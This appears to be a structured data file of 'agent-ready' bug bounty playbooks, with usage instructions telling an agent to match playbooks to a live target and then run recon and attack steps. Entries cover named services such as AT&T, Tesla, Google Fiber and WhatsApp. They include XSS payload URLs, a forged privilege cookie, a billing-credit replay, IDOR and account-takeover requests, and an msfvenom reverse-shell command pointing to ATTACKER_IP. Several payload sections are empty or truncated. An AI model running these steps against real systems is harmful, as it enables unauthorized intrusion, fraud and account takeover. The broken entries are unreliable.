description: Agent-ready bug bounty playbooks extracted from writeups.json. Same schema as agent_playbooks_github.json — safe to merge.

usage.step_1: Load tactic_index.json and look up your target's technology under by_technology to get relevant playbook IDs.
usage.step_2: Filter by by_access_level matching your current access to the target.
usage.step_3: Prioritize IDs in high_confidence and quick_wins lists for best hit rate.
usage.step_4: Load matching playbooks from this file by their 'id' field.
usage.step_5: Check trigger_conditions.prerequisites and applicability_signals against the live target.
usage.step_6: If conditions match, run attack_playbook.recon_steps first, then attack_steps.
usage.step_7: Confirm with success_indicators. If failed, use failure_indicators to pivot.

meta.title: Reflected XSS In AT&T

trigger_conditions.when_to_apply: This vulnerability applies when a web application uses a URL parameter's value within JavaScript variables on the page without proper sanitization, especially if the parameter is related to redirects or login URLs.
prerequisites: The target URL contains a parameter that is reflected in client-side JavaScript.
The application uses a JavaScript variable to store the value of a URL parameter.
applicability_signals: Observe the source code for parameters like 'loginUrl' or 'redirectUrl'.
Look for JavaScript variables that are populated directly from these URL parameters.
skip_if: WAF blocks all suspicious payloads.
The application URL parameter is not reflected in the page's source code or JavaScript.

recon_steps: Step 1: Use Google Dorking to find subdomains of att.com (e.g., 'site:*.att.com').
Step 2: Visit discovered subdomains and look for interesting endpoints, particularly those related to authentication or redirection, such as 'forgotPassword' pages.
attack_steps: Step 1: Navigate to the vulnerable endpoint, e.g., `https://ilm.att.com/bizportal/spp/forgotPassword?loginUrl=https://ilm.att.com`.
Step 2: Inspect the page's source code to identify how the `loginUrl` parameter is handled in JavaScript. Look for assignments to JS variables like `jsloginUrl`.

Step 3: Craft a malicious URL by injecting an XSS payload into the `loginUrl` parameter, ensuring it breaks out of the existing string context in the JavaScript variable. Example: `https://ilm.att.com/bizportal/spp/forgotPassword?loginUrl=x';alert(document.domain);x='`.
Step 4: Observe the resulting JavaScript in the page source to confirm successful injection.
Step 5: Trigger the XSS by opening the crafted URL in a browser.
tools_recommended: Browser Developer Tools: To inspect source code and JavaScript execution.
Google Search Operator: For subdomain enumeration.
success_indicators: An alert box pops up displaying `document.domain` (e.g., 'ilm.att.com').
The injected JavaScript code appears in the page's source code within the JavaScript variable assignment.
failure_indicators: No alert box appears, and the injected payload is not reflected as executable code in the source. This could indicate WAF blocking or improper escaping. Pivot to trying different XSS payloads or checking other parameters.
The `loginUrl` parameter is not reflected in JavaScript. This technique is not applicable.

playbooks.impact: An attacker can execute arbitrary JavaScript in the context of the victim's browser session on `ilm.att.com`. This could lead to session hijacking, stealing sensitive information displayed on the page, performing actions on behalf of the user, or redirecting the user to a malicious site.
playbooks.key_lesson: Always examine how URL parameters are used within client-side JavaScript. If they are directly assigned to string variables without sanitization, they are prime candidates for XSS injection, especially if they control redirect URLs or are part of authentication flows.

meta.title: Hunting Tesla Model Y Secrets in the Parts Catalog

trigger_conditions.when_to_apply: When an authenticated user can identify a cookie that controls access to different sections or permissions within the application and the cookie's value is in a manipulable format (e.g., Base64 encoded JSON).
prerequisites: An active Tesla account and the ability to log into the Parts Catalog site.
The ability to intercept and modify HTTP cookies.
applicability_signals: The presence of a cookie named 'EPCClaim' with Base64 encoded JSON content.
JavaScript source code revealing permission keys (e.g., 'modelYCatalog', 'isInternalUser', 'isGeneralPublic').
skip_if: Cookies are server-side encrypted or not easily decodable/manipulable.
All access control is solely handled by server-side validation and not influenced by client-side cookies.

recon_steps: Step 1: Log into the Tesla Parts Catalog website (epc.tesla.com) with a standard Tesla account.
Step 2: Use browser developer tools to inspect HTTP cookies. Identify the 'EPCClaim' cookie.
Step 3: Decode the Base64 value of the 'EPCClaim' cookie to reveal the JSON payload.
Step 4: Analyze the JSON payload for fields related to user roles, permissions, or access flags (e.g., 'isInternalUser', 'isGeneralPublic', 'permissions').
Step 5: Analyze JavaScript source files (e.g., '/scripts/scripts.<hash>.js') for potential permission values or keys that can be added to the cookie.
attack_steps: Step 1: Modify the decoded JSON payload. Change 'isGeneralPublic' to 'false' and 'isInternalUser' to 'true'.
Step 2: Add the identified 'modelYCatalog' permission value to the 'permissions' array or set it as a standalone permission if applicable.
Step 3: Re-encode the modified JSON payload back into Base64.
Step 4: Update the 'EPCClaim' cookie in the browser with the new Base64 encoded value.
Step 5: Refresh the Tesla Parts Catalog page and navigate to see if previously restricted content (e.g., Model Y parts) is now accessible.
payloads_or_patterns: Modified JSON Payload (example): `{"employeeId":0,"firstName":"General","lastName":"Public","email":"REDACTED@*****.com","countryCode":"US","languageId":null,"languageCode":null,"currencyCode":null,"isInternalUser":true,"isBodyShopUser":false,"isGeneralPublic":false,"tabs":false,"locationId":null,"bodyShopId":0,"bodyShopName":null,"bodyShopCategory":null,"permissions":"READONLY_CATALOG"}` (This specific JSON structure needs to be adapted based on the original cookie content and found JS permissions)
Payload Modification Strategy: Change `isGeneralPublic` to `false`, `isInternalUser` to `true`, and add `READONLY_CATALOG` (or similar found in JS) to permissions.
tools_recommended: Browser Developer Tools (for cookie inspection and modification, JavaScript analysis)
Online Base64 encoder/decoder
JSON formatter/editor
success_indicators: The Tesla Parts Catalog website displays Model Y related parts, schematics, or other previously inaccessible information.
New menu options or sections related to Model Y become visible in the UI.
failure_indicators: The website returns an error, a blank page, or the same restricted content after modifying the cookie. This might indicate that the cookie value is validated server-side in a way that ignores these specific fields or that the payload structure is incorrect. Pivot: Look for other cookies that might control access or attempt to find API endpoints that are not properly secured by bearer tokens as mentioned in the writeup.

playbooks.impact: An unauthenticated or low-privileged user can gain access to sensitive pre-release information about upcoming Tesla vehicles, such as parts catalogs and schematics, potentially for competitive intelligence or unauthorized disclosure.
playbooks.key_lesson: Always inspect cookie payloads for sensitive information or access control flags, especially when logged in as a regular user, and attempt to manipulate them to gain elevated privileges or access restricted content.

meta.title: Hacking SMS API Service Provider of a Company | Android App Static Security Analysis | Bug Bounty POC

trigger_conditions.when_to_apply: When an Android application uses an SMS API service provider and stores credentials insecurely within the application's code.
prerequisites: Ability to obtain and decompile the target Android application's APK file.
applicability_signals: Presence of a `Constant.java` file (or similar) in the decompiled code.
Keywords like 'SMS API', 'Username', 'Password', 'Endpoint', 'URL' found in the decompiled code.
Discovery of a URL related to an SMS API service provider.
skip_if: No sensitive credentials found in the decompiled static analysis.
Application logic heavily obfuscated, making static analysis infeasible.

recon_steps: Step 1: Download the target Android application's APK file from a trusted source or by extracting it from a device.
Step 2: Decompile the APK file using tools like `dex2jar` and `JD-GUI`, or a comprehensive tool like Mobile Security Framework (MobSF).
attack_steps: Step 1: Navigate through the decompiled Java source files, specifically looking for files named `Constant.java` or similar, or searching for keywords related to SMS APIs, credentials, and endpoints.
Step 2: Identify hardcoded credentials (username, password) and SMS API URLs within the discovered files.
Step 3: Use the extracted credentials and SMS API URL to access and control the SMS API gateway.
tools_recommended: apk.support/apk-downloader (for APK download)
apkpure.com (for APK download)
https://github.com/pxb1988/dex2jar (for DEX to JAR conversion)
JD-GUI (for JAR to Java source decompilation)
https://github.com/MobSF/Mobile-Security-Framework-MobSF (for comprehensive static analysis)
success_indicators: Successful login to the SMS API provider's platform using the disclosed credentials.
Access to functionalities like sending SMS, viewing customer phone numbers, or managing SMS campaigns.
failure_indicators: No sensitive credentials or API endpoints found in the static analysis. → Consider dynamic analysis or other attack vectors.
Invalid credentials or API endpoint discovered. → Double-check the decompiled code for transcription errors or look for alternative credentials.
Obfuscated code preventing analysis. → Attempt to use more advanced deobfuscation techniques or focus on other parts of the application.

playbooks.impact: Attacker gains unauthorized access to the SMS API gateway, enabling them to send fraudulent SMS messages, access customer data (phone numbers), potentially conduct phishing attacks, or disrupt services. This could lead to data breaches, financial loss, and reputational damage for the company and its clients.
playbooks.key_lesson: Always perform static analysis on Android applications to uncover hardcoded credentials and sensitive configuration data before proceeding with dynamic testing.

meta.title: A Tale of Two Formats: Exploiting Insecure XML and ZIP File Parsers to Create a Web Shell

target_profile.technology: Web Application handling custom file uploads (.xyz files)
tech_stack_fingerprints: Handles custom file formats packaged as ZIPs with XML manifests (common pattern in Java applications)

trigger_conditions.when_to_apply: When a web application accepts custom file uploads that are internally processed as ZIP archives containing XML manifests, and the underlying parsers are not configured securely.
prerequisites: The target must have a file upload functionality for a custom file type that is internally a ZIP archive.
The ZIP archive must contain an XML file that is parsed by the application.
The application's ZIP and XML parsers must be vulnerable to directory traversal and XXE, respectively.
applicability_signals: Application accepts file uploads with extensions like '.xyz' or similar custom types.
After upload, application displays details from a parsed XML manifest within the uploaded file.
The target application is likely Java-based, as these vulnerabilities are common in Java's default XML and ZIP parsing libraries.
skip_if: File upload is strictly validated against a whitelist of safe file types.
Application explicitly disables external entity processing in its XML parser.
Application sanitizes filenames within ZIP archives to prevent directory traversal characters.

recon_steps: Step 1: Identify the file upload endpoint and the accepted custom file types (e.g., '.xyz').
Step 2: Attempt to upload a valid ZIP file containing a simple XML manifest to observe the application's parsing and response behavior.
attack_steps: Step 1: Craft a malicious ZIP file. For XXE, include an XML file with an external entity pointing to a sensitive local file (e.g., '/etc/passwd'). For RCE via ZIP traversal, include a file with a path like '../webshell.php' within the ZIP.
Step 2: Upload the crafted ZIP file to the target application's upload endpoint.
Step 3: Observe the application's response. If XXE is successful, the content of the local file will be reflected in the application's response.
Step 4: If an XXE vulnerability is confirmed, attempt to place a web shell by crafting a ZIP file that exploits directory traversal to write a malicious script into a web-accessible directory.
Step 5: Test the uploaded web shell by sending a request to it.
payloads_or_patterns: XXE Payload (in manifest.xml within the ZIP):
Directory Traversal for Web Shell Payload (in manifest.xml or another file within the ZIP):
tools_recommended: Burp Suite for intercepting and analyzing HTTP requests/responses.
Custom Python script or any ZIP utility to craft malicious ZIP archives with specific filenames and content.
A tool to host the web shell if the target doesn't directly provide one.
success_indicators: XXE: The response from the application contains the content of a sensitive local file (e.g., /etc/passwd).
Directory Traversal: A file (e.g., webshell.php) is successfully created in a web-accessible directory.
RCE: The created web shell executes commands passed via HTTP requests (e.g., `?cmd=ls`).
failure_indicators: 4xx/5xx error responses without any sensitive data leakage (suggests input sanitization or parser configuration is blocking the exploit).
No creation of the web shell file in expected locations (suggests directory traversal is ineffective or the path is incorrect).
Response indicates the XML structure is invalid if the XXE payload is malformed.

playbooks.impact: Remote Code Execution (RCE) by creating a web shell in the web root directory, allowing an attacker to execute arbitrary commands on the server. Sensitive information disclosure through XXE by reading local files.
playbooks.key_lesson: Always defensively parse uploaded ZIP files and XML manifests. Explicitly disable XXE processing in XML parsers and implement strict filename validation and path canonicalization for ZIP extraction to prevent directory traversal.

meta.title: From Recon to Optimizing RCE Results – Simple Story with One of the Biggest ICT Company in the World

tech_stack_fingerprints: Login page pattern for Atlassian Crowd

trigger_conditions.when_to_apply: When an Atlassian Crowd instance is identified to be running an outdated and vulnerable version, specifically CVE-2019-11580.
prerequisites: Knowledge of a target's subdomain and its associated web applications.
applicability_signals: Outdated Atlassian Crowd version detected.
Web server hosting Atlassian Crowd responds to requests.
skip_if: Atlassian Crowd is running the latest patched version.
WAF blocks access to the Atlassian Crowd instance.

recon_steps: Step 1: Perform subdomain enumeration to identify all subdomains associated with the target.
Step 2: Scan identified subdomains for running services and identify Atlassian Crowd instances.
Step 3: Fingerprint the Atlassian Crowd version by examining HTTP response headers or the login page.
attack_steps: Step 1: Identify an Atlassian Crowd subdomain with a vulnerable version (e.g., prior to the patch for CVE-2019-11580).
Step 2: Utilize the public exploit for CVE-2019-11580 against the identified Atlassian Crowd server.
Step 3: Achieve root access to the compromised Atlassian Crowd server.
Step 4: Analyze the compromised server's network configuration to determine its position within the internal network.
Step 5: Leverage the access to the internal network to discover and interact with other internal assets.
payloads_or_patterns: Exploit code for CVE-2019-11580 (specific payload depends on the exploit details and desired action, e.g., reverse shell payload)
tools_recommended: Subdomain enumeration tools (e.g., Amass, Subfinder)
Vulnerability scanners (e.g., Nmap with NSE scripts, Nuclei)
Exploit database (e.g., Exploit-DB) for CVE-2019-11580
Metasploit Framework or custom scripts for exploitation and reverse shell establishment
success_indicators: Successful establishment of a reverse shell connection from the Atlassian Crowd server to the attacker's machine.
Ability to execute commands with root privileges on the Atlassian Crowd server.
Discovery of internal IP addresses and accessible internal assets from the compromised server.
failure_indicators: 5xx server errors or specific error messages indicating the exploit failed.
No response or connection refused when attempting to exploit.
WAF blocking the exploit attempts, requiring different evasion techniques or alternative attack vectors.

playbooks.impact: Gaining root access to an Atlassian Crowd server, which is often integrated into internal networks. This allows for lateral movement, access to sensitive internal assets, and potentially further compromise of the organization's infrastructure due to direct internal network access.
playbooks.key_lesson: Always enumerate and fingerprint subdomains thoroughly, and prioritize checking for known vulnerabilities in widely used applications like Atlassian Crowd, as outdated versions can lead to significant internal network compromise.

meta.title: How We Found Another XSS in Google with Acunetix

trigger_conditions.when_to_apply: When a Google service endpoint is found that processes URL fragments and dynamically submits a form based on that fragment.
applicability_signals: Response contains a JavaScript block that processes `location.hash` to configure and submit a form.
The JavaScript code splits the hash and decodes parts of it for use in form actions or hidden inputs.
skip_if: No URL fragment processing is observed in the JavaScript, or the fragment is not used in a way that could lead to injection.

recon_steps: Use Acunetix (or similar scanner) to scan Google services for XSS vulnerabilities.
Analyze scanner reports, specifically looking for JavaScript code that processes `location.hash`.
attack_steps: Observe the JavaScript code within the HTTP response for the vulnerable endpoint (e.g., `/ajax/pi/fbfr`).
Understand how the `location.hash` is parsed, decoded, and used to set the form's `action` attribute and create hidden input fields.
Construct a payload by crafting a `location.hash` value that includes a script execution sink.
Attempt to inject a simple JavaScript payload like `javascript:alert(document.cookie)` into the `location.hash`.
Test the payload by navigating to the crafted URL.
tools_recommended: Acunetix (for initial scanning)
Browser Developer Tools (for analyzing JavaScript and HTTP responses)
success_indicators: An `alert()` box displaying `document.cookie` appears when visiting the crafted URL.
failure_indicators: No `alert()` box appears, or a different response is received (e.g., 404, error page). This indicates the payload was not correctly formatted or the endpoint is not vulnerable as expected, requiring adjustments to the payload or a different analysis of the JavaScript.

If the JavaScript includes a check for 'http' in the decoded URL, a payload like `javascript:alert(document.cookie)` might be blocked. The fix implemented by Google specifically checks for 'http:' at the beginning of the decoded action URL. For similar targets, check if the decoded action URL is sanitized against specific protocols or patterns before submission.

playbooks.impact: Cross-Site Scripting (XSS) allows an attacker to execute arbitrary JavaScript code in the context of the victim's browser session. This can lead to session hijacking, defacement, redirection to malicious sites, or stealing sensitive information like cookies and personal data.
playbooks.key_lesson: Always meticulously analyze JavaScript code that processes user-controlled input, especially URL fragments, as it often reveals dynamic behavior leading to DOM-based XSS.

meta.title: Plan Change Logic in Google Fiber (Webpass)

trigger_conditions.when_to_apply: When a user initiates a plan change for their Google Fiber (Webpass) subscription, particularly when switching between annual and monthly billing.
prerequisites: Attacker must have an active Google Fiber (Webpass) subscription.
applicability_signals: The presence of a `/api/plan_changes` endpoint that accepts `from_subscription_id`, `cashier` parameters.
skip_if: If the `/api/plan_changes` endpoint consistently returns errors or requires authentication that cannot be bypassed.

recon_steps: Step 1: Observe network traffic when performing a plan change operation (e.g., switching from annual to monthly billing) in the Google Fiber (Webpass) web application. Look for API requests related to plan changes.
Step 2: Identify the specific API endpoint, HTTP method, and parameters used for plan changes, particularly those involving payment or subscription updates.
attack_steps: Step 1: Initiate a plan change that results in a payment being processed or a credit being applied to the account.
Step 2: Capture the API request associated with this plan change (e.g., POST /api/plan_changes).
Step 3: Replay the captured API request multiple times without making corresponding changes to the actual subscription or service. Observe the account balance and billing.
payloads_or_patterns:
POST /api/plan_changes HTTP/1.1
Host: webpass.net
Content-Type: application/x-www-form-urlencoded; charset=UTF-8

from_subscription_id=<USER_ID>&cashier=<PAYMENT_DETAILS>
tools_recommended: Burp Suite: To capture and replay HTTP requests.
Browser Developer Tools: To monitor network traffic.
success_indicators: The user's account balance increases by the amount of the payment/credit for each repeated request, while the billed amount reflects the new subscription plan. For example, initially paying $50 and switching to monthly billing resulted in a $550 credit and a $60 bill, with repeated requests further increasing the credit.
failure_indicators: Repeated requests to `/api/plan_changes` result in a 4xx or 5xx error, or the account balance does not change. This might indicate rate limiting, input validation, or state checking is in place. Pivot to investigate other API endpoints related to billing or subscription management.

playbooks.impact: An attacker can repeatedly apply payments or credits to their account without incurring additional service charges, leading to a significantly inflated account balance and potential financial loss for the service provider. In this case, the user was able to accumulate over $2,000 in credits.
playbooks.key_lesson: Always test the idempotency and state management of API endpoints involved in financial transactions or plan changes by replaying successful requests to observe for unintended side effects.

meta.title: CVE-2019-18426 - WhatsApp Vulnerabilities Disclosure - Open Redirect + CSP Bypass + Persistent XSS + FS read permissions + potential for RCE

trigger_conditions.when_to_apply: When an attacker can intercept and modify message objects during the message composition process in WhatsApp Web/Desktop, specifically targeting messages with rich preview banners.
prerequisites: Attacker must be able to use WhatsApp Web or Desktop client.
Attacker must have the ability to intercept and modify JavaScript objects during the message sending flow.
applicability_signals: Target application is WhatsApp Web or Desktop.
Existence of rich preview banners for links within messages.
Ability to debug or modify client-side JavaScript execution.
skip_if: No rich preview banners are generated for links.
Client-side JavaScript is heavily obfuscated or protected against modification.

recon_steps: Step 1: Use browser developer tools to inspect the JavaScript code of WhatsApp Web/Desktop, specifically looking for message object creation and handling.
Step 2: Identify the JavaScript code responsible for generating rich preview banners for URLs embedded in messages.
attack_steps: Step 1: Using browser developer tools, set a breakpoint at the JavaScript code responsible for forming the message object (e.g., `var t = e.id;` as suggested in the writeup).
Step 2: When the breakpoint is hit, intercept the message object `e`.
Step 3: Modify the `e.__x_body` and `e.__x_matchedText` properties to a malicious URL (e.g., `https://evil.com`).
Step 4: Allow the message sending process to continue.
Step 5: Observe the recipient's view of the message.
tools_recommended: Browser Developer Tools (e.g., Chrome DevTools, Firefox Developer Edition) for JavaScript debugging and manipulation.
success_indicators: The rich preview banner displayed to the recipient shows a legitimate-looking domain, but clicking it redirects to the attacker-controlled URL (<TARGET_URL>).
The message body itself might also be altered to include the malicious URL.
failure_indicators: The link in the preview banner does not resolve to the attacker-controlled URL or remains as a legitimate URL.
WhatsApp's client-side filtering or validation prevents the modification of the URL properties.

playbooks.impact: An attacker can trick users into clicking malicious links by presenting them as legitimate previews, leading to phishing attacks, credential theft, or further exploitation via the redirected website.
playbooks.key_lesson: Always validate and sanitize URLs used in message previews and link previews on client-side applications, as client-side manipulation can lead to redirect vulnerabilities.

meta.title: A Simple IDOR to Account Takeover

trigger_conditions.when_to_apply: The password reset functionality allows modification of the user's email address directly within the request body.
prerequisites: Attacker has an authenticated account on the target application.
applicability_signals: Password reset endpoint accepts JSON in the request body.
The request body for password reset contains an 'email' parameter.
skip_if: Password reset endpoint does not accept JSON.
Password reset endpoint does not have an 'email' parameter.
The 'email' parameter is validated against the currently logged-in user's email.

recon_steps: Step 1: Navigate to the password reset functionality and initiate a password change for your own account.
Step 2: Intercept the HTTP request using a proxy (e.g., Burp Suite). Observe the request parameters and body.
attack_steps: Step 1: Modify the 'email' parameter in the intercepted request body to the email address of a victim account.
Step 2: Forward the modified request.
Step 3: Observe the response. If successful, the password for the victim's account will be reset to the new password specified in the request.
Step 4: Attempt to log in to the victim's account using the new password.
tools_recommended: Burp Suite: Intercept and modify HTTP requests.
success_indicators: Password reset confirmation for the victim's account is received.
Successful login to the victim's account using the newly set password.
failure_indicators: Error response indicating invalid email format or user not found.
Response indicating that the email cannot be changed to an existing user.
403 Forbidden response after forwarding the modified request.

playbooks.impact: Account Takeover (ATO) of victim accounts. If the victim is an administrator, this can lead to full control of the application.
playbooks.key_lesson: Always validate that the target object being modified (e.g., email address in password reset) belongs to the authenticated user and is not directly manipulable with an arbitrary value.

meta.title: Determine users with detailed role model on behalf of any Facebook Application

affected_components: User profile enumeration via application roles

trigger_conditions.when_to_apply: When a Facebook application allows for detailed role management and exposes user identifiers or role assignments without proper authorization checks.
prerequisites: Attacker has an authenticated Facebook account.
Target Facebook application is installed and has user roles configured.
applicability_signals: The application allows users to invite or manage roles for other users.
API endpoints related to user roles return detailed information about users and their assigned roles.
User identifiers (e.g., user IDs) are predictable or can be enumerated.
skip_if: All user role management endpoints strictly enforce session and role-based access control.
User IDs are opaque and cannot be enumerated or guessed.

recon_steps: Step 1: Analyze the target Facebook application's functionalities, specifically focusing on any user invitation, management, or role assignment features.
Step 2: Use browser developer tools (Network tab) to monitor HTTP requests made during user role management operations. Identify API endpoints involved.
Step 3: Examine responses from role management API endpoints for patterns related to user identifiers, role names, and associated permissions.
attack_steps: Step 1: Authenticate as a regular user of the target Facebook application.

Step 2: Attempt to enumerate user IDs associated with the application. This might involve guessing sequential IDs, using known user IDs if available, or observing IDs in application UI elements or API responses.
Step 3: For each enumerated user ID, send requests to the application's API endpoints responsible for retrieving user role information, substituting the enumerated user ID.
Step 4: Analyze the responses to identify detailed role information for users other than the attacker's own account.
tools_recommended: Burp Suite: To intercept and modify HTTP requests, enumerate user IDs, and analyze responses.
Custom scripts (Python/JavaScript): For automated user ID enumeration and API request sending.
success_indicators: Receiving detailed role information (e.g., 'admin', 'editor', 'viewer') for a user ID that does not belong to the attacker.
Successfully modifying the role of another user by sending a request with a different user's ID and an elevated role.
failure_indicators: Receiving a 403 Forbidden or 401 Unauthorized error for all attempted user ID role queries.
The API consistently returns only the attacker's own user information, regardless of the substituted user ID.

playbooks.impact: An attacker can enumerate detailed role models of other users within a Facebook application. This can lead to unauthorized information disclosure about user privileges and potentially allow for privilege escalation if role modification is also vulnerable.
playbooks.key_lesson: Always validate that API endpoints retrieving or modifying user-specific information, especially roles and permissions, are strictly tied to the authenticated user's session and do not allow for arbitrary user ID substitution.

meta.title: IDOR leads to Data leakage and Profile Update

trigger_conditions.when_to_apply: When a user can update their profile and the user ID is present in the API endpoint.
prerequisites: Attacker has at least one authenticated user account.
Target web app uses numeric or UUID-like user IDs that are discoverable.
applicability_signals: API endpoint for user profile update includes the user ID in the URL.
User profile update requests return a 200 OK status code.
API responses contain user-specific information that is not strictly limited to the currently authenticated user.
skip_if: API returns 403 Forbidden or 401 Unauthorized when attempting to update another user's profile.
User IDs are not exposed in requests or responses.
The API enforces strict ownership checks on profile update operations.

recon_steps: Step 1: Register two user accounts on the target application.
Step 2: Observe network traffic while updating the profile of the first account. Identify the API endpoint and the user ID used in the request.
Step 3: Identify the user ID of the second account through registration or by observing traffic when interacting with its profile, if possible.
attack_steps: Step 1: Authenticate as the first user.
Step 2: Capture the request to update the first user's profile (e.g., PUT /users/<user_id_account_A>). Note the user ID in the request.
Step 3: Modify the request to use the user ID of the second account (e.g., PUT /users/<user_id_account_B>), while keeping the Authorization header of the first user.
Step 4: Send the modified request and observe the response.
payloads_or_patterns:
PUT /users/<TARGET_USER_ID> HTTP/1.1
Host: clientapi.website.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en,en-US;q=0.7,de;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/json; charset=utf-8
Authorization: <SESSION_TOKEN>
Content-Length: <content_length>
Origin: https://app.website.com
Connection: close

{"user":{"firstName":"attacker_controlled_name","lastName":"attacker_controlled_last","email":"attacker_controlled@email.com","password":null,"dismissedGuides":{"contractHelpPopup":false},"company":"<company_id>"}}
tools_recommended: Burp Suite: Intercept and modify HTTP requests.
OWASP ZAP: Similar functionality to Burp Suite.
success_indicators: The API returns a 200 OK status code.
The response body contains user information from the second account (e.g., email, first name, last name, company details).
The profile of the second user is updated with the data sent in the request from the first user's session.
failure_indicators: API returns 403 Forbidden or 401 Unauthorized.
API returns a generic error message indicating authorization failure.
The response does not contain data from the target user's account, or the profile update fails without affecting the target user.

playbooks.impact: An attacker can read sensitive information (email, company details, etc.) of other users and update their profile details, potentially leading to account takeover or unauthorized data modification.
playbooks.key_lesson: Always test the authorization of ID parameters in API requests by attempting to access or modify resources belonging to other authenticated users.

meta.title: Popping Alerts in Mixmax Chrome Extension

trigger_conditions.when_to_apply: When the Mixmax Chrome Extension's 'insert link/URL' feature is present and allows user-controlled input to be embedded in a way that isn't properly sanitized before being displayed to other users.
prerequisites: The user must have the Mixmax Chrome Extension installed and be logged in.
applicability_signals: The presence of an 'insert link/URL' functionality within the Mixmax Chrome Extension that processes user-provided URLs.
skip_if: If the 'insert link/URL' feature has robust input sanitization that prevents XSS payloads from being rendered, or if the functionality is no longer present.

recon_steps: Identify and understand the functionality of the 'insert link/URL' feature in the Mixmax Chrome Extension.
Observe how user-provided URLs are processed and displayed within the extension's interface or related components.
attack_steps: Step 1: Craft an XSS payload that includes an `alert()` function and a malicious URL, for example, `<script>alert(1)</script>` or a URL that, when rendered, executes JavaScript.
Step 2: Use the 'insert link/URL' feature of the Mixmax Chrome Extension to insert the crafted payload.
Step 3: Share or present the link/URL to another user who also has the Mixmax Chrome Extension installed and active.
tools_recommended: Browser Developer Tools (to observe DOM manipulation and JavaScript execution)
Burp Suite (for intercepting and modifying requests if applicable, though this seems client-side focused)
success_indicators: An alert box with the message 'XSS' pops up in the victim's browser when they interact with the inserted link/URL.
failure_indicators: The payload is rendered as plain text, or the URL is escaped/sanitized without executing JavaScript. This indicates the payload needs to be modified for bypass or the vulnerability is fixed. The writeup mentions a self-XSS scenario initially, which means the payload might have been filtered after submission but before display to the intended victim, thus only affecting the attacker's own view.
If the XSS does not trigger, consider variations of XSS payloads or different insertion points if available.

playbooks.impact: Execution of arbitrary JavaScript in the context of the victim user's browser, potentially leading to session hijacking, data theft, or further malicious actions within the Mixmax extension's capabilities.
playbooks.key_lesson: Always test user-controlled input within browser extensions for XSS vulnerabilities, especially when such input is intended to be shared or rendered in a way that affects other users. Pay close attention to how the extension sanitizes and displays such data.

meta.title: Simple Remote Code Execution Vulnerability Examples for Beginners

trigger_conditions.when_to_apply: When a target is identified to be running a version of SugarCRM that has a known RCE vulnerability, especially if standard exploit payloads are blocked.
prerequisites: Target is running a vulnerable version of SugarCRM.
applicability_signals: Discovery of SugarCRM on target
Identification of a specific vulnerable version number
Search results indicating known RCE vulnerabilities for that version.
skip_if: Target is not running SugarCRM
Target is running a patched version of SugarCRM

recon_steps: Step 1: Fingerprint the target application to identify if SugarCRM is in use.
Step 2: If SugarCRM is detected, attempt to determine the exact version number by inspecting HTTP headers, HTML source, or specific response files.
Step 3: Search public vulnerability databases (e.g., Exploit-DB, CVE) for known RCE vulnerabilities associated with the identified SugarCRM version.
attack_steps: Step 1: If a known RCE vulnerability is found (e.g., via Metasploit module), attempt to run the exploit against the target.
Step 2: If the initial exploit fails to establish a session (e.g., due to firewall blocking), analyze the exploit code.
Step 3: Modify the exploit payloads (e.g., different bind/reverse shell types, encoding) to bypass network restrictions.
Step 4: If direct exploit fails, consider alternative RCE methods relevant to SugarCRM, such as exploiting unrestricted file uploads if present.
payloads_or_patterns: Exploit code for known SugarCRM RCE vulnerabilities
Modified reverse/bind shell payloads (e.g., `msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ATTACKER_IP> LPORT=<ATTACKER_PORT> -f raw`)
tools_recommended: Metasploit Framework: For running known exploit modules and generating custom payloads.
Burp Suite: For intercepting and analyzing HTTP traffic, and potentially for fuzzing.
Google Dorks: To discover hidden or less obvious web pages, including potential administrative interfaces or specific file types.
success_indicators: Successful establishment of a shell or meterpreter session on the target server.
Execution of arbitrary commands on the target system.
Response indicating successful payload delivery and execution.
failure_indicators: Exploit completion without session establishment.
Firewall blocking of shell connections (incoming or outgoing).
Target system responding with errors indicating patched vulnerabilities or incorrect exploitation.
403 Forbidden or similar access denied responses when trying to exploit known vulnerable endpoints.

playbooks.impact: Remote Code Execution allows an attacker to execute arbitrary code on the target server, potentially leading to full system compromise, data exfiltration, or further network pivoting.
playbooks.key_lesson: Always check for known vulnerabilities associated with specific software versions identified during reconnaissance, especially for popular applications like SugarCRM, and be prepared to modify payloads to bypass network security controls.

meta.title: Site wide CSRF on a popular program

tech_stack_fingerprints: application/x-www-form-urlencoded POST requests accepted by an API endpoint
API expects JSON but does not strictly validate Content-Type header

trigger_conditions.when_to_apply: When an authenticated user can send POST requests to an API endpoint that is vulnerable to CSRF due to improper Content-Type validation, allowing the processing of non-JSON parameters.
prerequisites: Authenticated user session is available.
Target application uses JSON for request bodies in some API endpoints.
Target application does not strictly enforce `Content-Type: application/json` header for all JSON-expecting endpoints.
applicability_signals: API endpoint accepts POST requests.
API endpoint appears to expect JSON payloads.
The `Content-Type` header can be manipulated or is not strictly validated by the server.
skip_if: All API endpoints strictly enforce `Content-Type: application/json` and reject any other content types.
Application employs robust CSRF token mechanisms that are validated on every state-changing request.

recon_steps: Step 1: Identify an authenticated user's state-changing API requests (e.g., updating profile, performing an action).
Step 2: Analyze the request's `Content-Type` header and request body. If the body is JSON and `Content-Type` is `application/json`, proceed.
Step 3: Attempt to submit the same request with `Content-Type: application/x-www-form-urlencoded` and a standard form-encoded body containing the same parameters.
attack_steps: Step 1: Construct an HTML form that uses the `application/x-www-form-urlencoded` enctype.
Step 2: Set the form's `method` to `POST` and the `action` attribute to the target API endpoint (`<TARGET_URL>/api/REDACTED/PATH`).
Step 3: Include input fields in the form with `name` attributes corresponding to the parameters expected by the API, and set their `value` attributes to malicious or desired values.
Step 4: Use JavaScript to automatically submit this form upon page load.
payloads_or_patterns:
primaryPhoneType
firstName
tools_recommended: Burp Suite Repeater: To manually test changing `Content-Type` headers.
Burp Suite Collaborator / Interactsh: To detect out-of-band interactions if the CSRF leads to sensitive data exfiltration or server-side requests.
Custom HTML file: To host the auto-submitting form.
success_indicators: The target action is performed successfully (e.g., profile updated, settings changed) when the victim visits the crafted HTML page, as evidenced by a 2xx or 3xx HTTP status code in the server's response to the POST request.
Observable changes in the victim's account settings or data that the attacker specified in the form payload.
failure_indicators: The server responds with a 415 Unsupported Media Type or a 400 Bad Request, indicating strict `Content-Type` validation or improper payload parsing.
No change occurs in the target application after the payload is submitted, and no error is returned that indicates the parameters were processed.

